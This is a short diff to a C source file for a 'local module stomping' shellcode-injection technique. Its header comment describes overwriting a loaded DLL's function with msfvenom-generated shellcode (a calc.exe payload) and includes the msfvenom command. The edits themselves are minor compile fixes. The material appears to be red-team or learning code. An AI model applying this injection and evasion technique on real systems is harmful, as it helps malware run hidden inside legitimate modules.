@@ -2,9 +2,10 @@
 * Local module stomping: load a sacrificial DLL into the process memory, locate a function to stomp (it'll be within the .text section, this is lazy)
 *                        & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
 * shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
-* compile: cl.exe local-stomp.cpp /W0
+* compile: cl.exe local-stomp.c /W0
 */
 #include <windows.h>
+#include <stdbool.h>
 #include <stdio.h>
 
 int main() {
@@ -41,7 +42,7 @@ int main() {
     printf("[*] Running PI with target PID: %u\n", pid);
 
     // Open a handle to the current process
-    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
+    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if(pHandle == NULL) {
         printf("Failed to acquire process handle!\n");
         return -1;
